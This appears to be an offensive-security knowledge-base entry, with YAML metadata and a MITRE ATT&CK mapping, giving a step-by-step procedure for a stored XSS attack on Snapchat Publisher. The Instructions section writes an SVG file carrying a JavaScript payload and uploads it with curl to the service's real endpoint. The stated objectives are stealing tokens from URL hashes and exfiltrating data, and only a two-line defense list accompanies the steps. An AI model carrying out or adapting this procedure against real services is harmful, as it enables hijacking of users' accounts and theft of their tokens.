---
tags:
  - xss
  - svg-upload
type: procedure
tools:
  - '[[tools/Curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-upload-svg]]'
platforms:
  - Web
  - GCP
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 0abd2759-9f69-453e-acad-d37e14de74b3
created_at: '2025-12-13T09:01:26.667Z'
updated_at: '2025-12-13T09:01:26.667Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Upload Malicious SVG for XSS

## Summary

This procedure uploads an SVG file with embedded JavaScript to Snapchat Publisher, hosting it on Google Cloud Storage for XSS execution.

## Description

SVG files are not sanitized, allowing JS execution when loaded. This is used to steal tokens from URL hashes in the attack chain.

## Requirements

1. Snapchat Publisher account
2. Malicious SVG file with JS payload
3. Access to upload endpoint

## Defense

Defensive measures and detection strategies:

- Sanitize uploaded SVG files
- Disable script execution in hosted images

## Objectives

1. Host malicious SVG on GCS
2. Prepare for XSS-based token theft
3. Enable data exfiltration

## Instructions

### Step 1: Prepare SVG Payload

**Context**: Create SVG with JS to log location.hash.

**Command** ([[commands/curl-upload-svg]]):
```bash
echo '<svg><script>console.log(location.hash)</script></svg>' > malicious.svg
```

> Creates the file.

### Step 2: Upload SVG

**Context**: Send the file to the upload endpoint.

**Command** ([[commands/curl-upload-svg]]):
```bash
curl -X POST 'https://snappublisher.snapchat.com/snaps/create/new' -F 'file=@malicious.svg' -H 'Content-Type: multipart/form-data'
```

> Uploads and hosts the SVG.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used

- [[commands/curl-upload-svg]]

## Tools Used

- [[tools/Curl]]

## Tags

- [[xss]]
- [[svg-upload]]
